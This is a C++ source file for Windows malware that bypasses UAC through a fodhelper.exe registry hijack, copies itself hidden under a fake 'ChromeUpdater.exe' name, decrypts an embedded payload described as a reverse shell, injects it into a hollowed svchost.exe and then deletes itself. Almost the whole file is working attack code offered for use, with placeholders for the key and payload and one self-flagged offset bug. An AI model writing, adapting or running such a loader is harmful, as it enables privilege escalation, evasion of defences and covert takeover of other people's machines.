// UACBypassProcHollowSelfDelete.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <ntstatus.h>
#include <map>
#include <string>
#include <shlwapi.h>
#include <stdlib.h>
#include <bcrypt.h>
#pragma comment(lib,"bcrypt.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib, "Shlwapi.lib")
using std::map;
using std::string;

#define FSTREAM_RENAME L":wtfbbq"

//zw query information
typedef unsigned long(__stdcall* pfnZwQueryInformationProcess)(IN  HANDLE, IN  unsigned int, OUT PVOID, IN  ULONG, OUT PULONG);

pfnZwQueryInformationProcess ZwQueryInfoProcess = (pfnZwQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQueryInformationProcess");

// use ntQuerySystemInformation to get parent process info
typedef DWORD(WINAPI* PNTQUERYSYSYTEMINFORMATION)(DWORD info_class, void* out, DWORD size, DWORD* out_size);
PNTQUERYSYSYTEMINFORMATION pNtQuerySystemInformation = (PNTQUERYSYSYTEMINFORMATION)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation");

wchar_t parentImageName[MAX_PATH + 1];
string fullPath;

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

// obv make sure when you encrypted you did the reverse of below decrypt function
unsigned char iv[] =
{ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
unsigned char key[] =
{ }; // replace 16 byte key
unsigned char payload[] =
{ }; // replace payload



int bufSize = sizeof(payload);
PBYTE decrypted;
DWORD decryptedSize;

int Error(const char* msg) {
    printf("%s (%u)\n", msg, GetLastError());
    return 1;
}

int DecryptPayload() {
    // openAlgProvider
    // open alg handle section // 
    BCRYPT_ALG_HANDLE hAesAlg;
    if (BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
        return Error("Failed to get handle to algo provider");
    }
    // get key and handle to key ///
    //calc size of buffer to hold key object
    DWORD keyObjSize;
    DWORD bytesRead;
    if (BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&keyObjSize, sizeof(DWORD), &bytesRead, 0) != STATUS_SUCCESS)
        return Error("Failed to get size for key object");
    PBYTE keyObject;
    keyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, keyObjSize);
    if (keyObject == NULL)
        return Error("Failed to alloc heap for keyObject");
    // calc block length for IV
    DWORD blockLenSize;
    if (BCryptGetProperty(hAesAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&blockLenSize, sizeof(DWORD), &bytesRead, 0) != STATUS_SUCCESS)
        return Error("Failed to get size for IV");
    // check if blockLen is longer than IV
    if (blockLenSize > sizeof(iv))
        return Error("Error Block len is greater than IV");
    //alloc buffer for iv 
   //buffer is consumed during encrypt/decrypt process
    PBYTE ivBuffer;
    ivBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, blockLenSize);
    if (ivBuffer == NULL) {
        return Error("Failed to alloc memory for iv buffer");
    }
    //copy iv into ivBuffer
    memcpy(ivBuffer, iv, blockLenSize);
    // set mode aes CBC
    if (BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != STATUS_SUCCESS)
        return Error("Failed to set decryption mode");
    // generate key from key bytes
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptGenerateSymmetricKey(hAesAlg, &hKey, keyObject, keyObjSize, (PBYTE)key, sizeof(key), 0) != STATUS_SUCCESS)
        return Error("Failed to generated key from key bytes");
    // continue here
     // get output buffer size for decrypted text
    if (BCryptDecrypt(hKey, payload, sizeof(payload), NULL, ivBuffer, blockLenSize, NULL, 0, &decryptedSize, BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS)
        return Error("Failed to get size of decrypted payload");
    // allocate memory for decrypted text
    decrypted = (PBYTE)HeapAlloc(GetProcessHeap(), 0, decryptedSize);
    if (decrypted == NULL)
        return Error("Failed to allocate memory for plaintext");
    if (BCryptDecrypt(hKey, payload, sizeof(payload), NULL, ivBuffer, blockLenSize, decrypted, decryptedSize, &decryptedSize, BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS)
        return Error("Failed to decrypt payload");
    // free memory and close handles
    BCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (hKey)
        BCryptDestroyKey(hKey);
    //if (decrypted)
    //    HeapFree(GetProcessHeap(), 0, decrypted);
    if (keyObject)
        HeapFree(GetProcessHeap(), 0, keyObject);
    if (ivBuffer)
        HeapFree(GetProcessHeap(), 0, ivBuffer);
    printf("::: successful! :::\n");
    return 0;
}



int SelfDelete() {
    //Credit to @jonasLyk and  @LloydLabs https://github.com/LloydLabs/delete-self-poc
    HANDLE hCurrentProcess;
    // get path to current running process
    char currentPath[MAX_PATH + 1];
    if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0)
        return Error("Failed to get current module filename");
    hCurrentProcess = CreateFileA(currentPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hCurrentProcess == INVALID_HANDLE_VALUE)
        return Error("Failed to get handle to current process");
    //rename module file name
    FILE_RENAME_INFO fRename;
    RtlSecureZeroMemory(&fRename, sizeof(fRename));
    // set our filename len and filename tods_
    const wchar_t* lpcStream = FSTREAM_RENAME;
    fRename.FileNameLength = sizeof(lpcStream);
    RtlCopyMemory(fRename.FileName, lpcStream, sizeof(lpcStream));
    if (SetFileInformationByHandle(hCurrentProcess, FileRenameInfo, &fRename, sizeof(fRename) + sizeof(lpcStream)) == 0)
        return Error("Failed to rename file stream");
    //printf("successfully renamed file primary : $DATA ADS to specified stream, closing initial handle\n");
    // close handle to file
    CloseHandle(hCurrentProcess);
    //open handle again
    hCurrentProcess = CreateFileA(currentPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hCurrentProcess == INVALID_HANDLE_VALUE)
        return Error("Failed to get handle to current process second time");
    // perform delete
    FILE_DISPOSITION_INFO fDelete;
    RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
    fDelete.DeleteFile = TRUE;
    if (SetFileInformationByHandle(hCurrentProcess, FileDispositionInfo, &fDelete, sizeof(fDelete)) == 0)
        return Error("failed to set delete disposition");
    //trigger deletion
    CloseHandle(hCurrentProcess);
    if (PathFileExistsA(currentPath))
        return Error("Failed to delete file");
    //successfully deleted
    //printf("Successfully deleted");
    return 0;
}

int GetParentProcName() {
    // credit to http://www.rohitab.com/discuss/topic/40504-using-ntquerysysteminformation-to-get-process-list/
    // @zwclose7 post helped alot
    size_t bufferSize = 102400;
    ULONG ulReturnLength;
    NTSTATUS status;
    map <int, wchar_t*> pidMap;
    int myPid = GetCurrentProcessId();
    int parentPid = -1;
    int parentPidImageSize;
    PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PSYSTEM_PROCESS_INFO procInfo;
    procInfo = (PSYSTEM_PROCESS_INFO)buffer;
    status = pNtQuerySystemInformation(SystemProcessInformation, procInfo,1024*1024,NULL);
    if (status != STATUS_SUCCESS)
        return Error("Failed to query proc list");
    // save into dictionary
    while (procInfo->NextEntryOffset) {
        printf("Image Name: %ws\n", procInfo->ImageName.Buffer);
        procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
        pidMap[(int)procInfo->ProcessId] = procInfo->ImageName.Buffer;
        if ((int)procInfo->ProcessId == myPid) {
            int parentPid = (int)procInfo->InheritedFromProcessId;
            parentPidImageSize = procInfo->ImageName.Length;
            printf("found parent pid:: %d\n",parentPid);
            printf("found parent image name: %ws\n",pidMap[parentPid]);
            wcsncpy_s(parentImageName, pidMap[parentPid], parentPidImageSize);
            VirtualFree(buffer, 0, MEM_RELEASE);
            return 0;
        }
    }
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 1;
}

int CopyMyselfToPersistentLocation() {
    // get path to app data
    char homePath[MAX_PATH];
    char currentPath[MAX_PATH];
    char currentExeName[MAX_PATH];
    //string fullPath; set as global cause we need it later for reg edit function
    string srcPath;
    if (GetEnvironmentVariableA("LOCALAPPDATA", homePath, sizeof(homePath)) == 0)
        return Error("Failed to get HOMEPATH var");
    //printf("%s\n", homePath);
    fullPath = homePath;
    fullPath.append("\\Temp");
    if (GetModuleFileNameA(NULL, currentPath, sizeof(currentPath)) == 0)
        return Error("failed to get current exe path");
    // get current name of myself
    if (GetFileTitleA(currentPath, currentExeName, sizeof(currentExeName)) != 0)
        return Error("failed to get current exe name");
    srcPath = currentPath;
    fullPath.append("\\");
    fullPath.append("ChromeUpdater.exe"); // change to cool name of program
    // copy myself to hidden folder
    if (CopyFileA(srcPath.c_str(), fullPath.c_str(), TRUE) == 0)
        return Error("Failed to copy myself!");
    // set new file as hidden
    if (SetFileAttributesA(fullPath.c_str(), FILE_ATTRIBUTE_HIDDEN) == 0)
        return Error("failed to set file as hidden");
    return 0;
}

int SetupReg() {
    HKEY hKey;
    DWORD dwType;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return Error("Failed to create key or get handle to it if its exists");
    if (RegSetValueExA(hKey, NULL, 0, REG_SZ,(BYTE*)fullPath.c_str(),fullPath.size()) != ERROR_SUCCESS)
        return Error("Failed to set registry key");
    if (RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,NULL, 0) != ERROR_SUCCESS)
        return Error("Failed to set registry key");
    RegCloseKey(hKey);
    return 0;
}

int CleanReg() {
    HKEY hKey;
    DWORD dwType;
    string empty = "";
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return Error("Failed to create key or get handle to it if its exists");
    RegDeleteValueA(hKey, "DelegateExecute");
    RegDeleteValueA(hKey, NULL);
    RegCloseKey(hKey);
    return 0;

}

int StartFodHelper() {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char fodPath[] = "C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\fodhelper.exe";
    char cmd[] = "C:\\Windows\\System32\\cmd.exe";
    if (!CreateProcessA(cmd, fodPath, nullptr, nullptr, false, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return Error("Failed to create fod helper process");
    printf("::: Created PID %u :::\n", pi.dwProcessId);
    return 0;
}



int procHollow()
{
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char svcHost[] = "C:\\windows\\system32\\svchost.exe";
    if (!CreateProcessA(nullptr, svcHost, nullptr, nullptr, false, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) 
        return Error("Failed to create process");
    printf("::: Created PID %u :::\n", pi.dwProcessId);
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;
    // errors check here
    HANDLE hProcess = pi.hProcess;
    ZwQueryInfoProcess(hProcess, ProcessBasicInformation, &bi, sizeof(bi), &tmp);
    PVOID peb = &bi.PebBaseAddress;
    PVOID ptrToImageBase = bi.PebBaseAddress->Reserved3 + 0x1; // <= issue right here needs to add 0x10 to address
    printf("::: peb base =>     0x%p :::\n", bi.PebBaseAddress);
    printf("::: ptr img base => 0x%p :::\n", ptrToImageBase);
    unsigned char addrBuf[8];
    int addrBufLength = sizeof(addrBuf);
    SIZE_T nRead;
    SIZE_T nWrite;
    if (ReadProcessMemory(hProcess, PBYTE(ptrToImageBase), &addrBuf, 8, &nRead) == 0) 
        return Error("Failed to read memory from process");
    printf("::: num bytes read into buffer => %u :::\n", nRead);
    uint64_t processBaseAddress = *reinterpret_cast<uint64_t*>(addrBuf); // <= points to entry point
    printf("::: process Base Address => %p :::\n", processBaseAddress);
    unsigned char data[0x200]; // <= memory we need to parse in child process
    int dataLength = sizeof(data);
    if (ReadProcessMemory(hProcess, (void*)processBaseAddress, data, dataLength, &nRead) == 0) 
        return Error("Failed to read memory from process 2");
    printf("::: num bytes read into buffer => %u :::\n", nRead);
    printf("::: Reading done need to parse memory now :::\n");
    IMAGE_DOS_HEADER dos_headers{ };
    IMAGE_NT_HEADERS nt_headers{ };
    if (ReadProcessMemory(hProcess, reinterpret_cast<const void*>(processBaseAddress), &dos_headers, sizeof(IMAGE_DOS_HEADER), nullptr) == 0) 
        return Error("Failed to read dos header");
    if (ReadProcessMemory(hProcess, reinterpret_cast<const void*>(processBaseAddress + dos_headers.e_lfanew), &nt_headers, sizeof(IMAGE_NT_HEADERS), nullptr) == 0) 
        return Error("failed to read nt header");
    DWORD64 test = (DWORD64)nt_headers.OptionalHeader.AddressOfEntryPoint;
    uint64_t addressOfEntryPoint = processBaseAddress + nt_headers.OptionalHeader.AddressOfEntryPoint;
    printf("::: addr of entry point in child process :::%p\n", addressOfEntryPoint);
    printf("::: decrypting payload :::\n");
    DecryptPayload();
    if (WriteProcessMemory(hProcess, reinterpret_cast<void*>(addressOfEntryPoint), decrypted, decryptedSize, &nRead) == 0) 
        return Error("Failed to write payload");
    ResumeThread(pi.hThread);
    return 0;

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
//int main()
{
    if (GetParentProcName() != 0)
        return Error("Failed to get parent image name");
    printf("%ws\n", parentImageName);
    if (wcscmp(parentImageName, L"fodhelper.exe") != 0) {
        printf("Exe not started by fodhelper, attempting to setup registry and execute fod helper");
        // copy myself to new location
        if (CopyMyselfToPersistentLocation() != 0)
            return Error("Failed to copy myself");
        // set registry value to point to my newly copied location
        if (SetupReg() != 0)
            return Error("Failed to set reg");
        // execute fodhelper.exe 
        if (StartFodHelper() != 0) 
            return Error("failed to start fod helper"); //char err[10]//_itoa_s(GetLastError(), err, 10);//MessageBoxA(NULL, err, "failed", MB_OK);
        Sleep(5000); // sleep so actual shellcode can execute
        // clean registry keys
        if (CleanReg() != 0)
            return Error("failed to cleanup reg");
        // self delete current exe
        if (!SelfDelete() != 0)
            return Error("Failed to self delete lol");
        // your done
        return 0;
    }
    // started by fod helper just execute reverse shell process hollow and self delete
    // this ensures process is started in elevated state
    if (procHollow() != 0)
        //MessageBoxA(NULL, "failed proc hollow", "ok", MB_OK);
        return Error("Failed to create proc hollow");
    if (SelfDelete() != 0)
        //MessageBoxA(NULL, "failed self delete", "ok", MB_OK);
        return Error("failed to self delete lol");

}
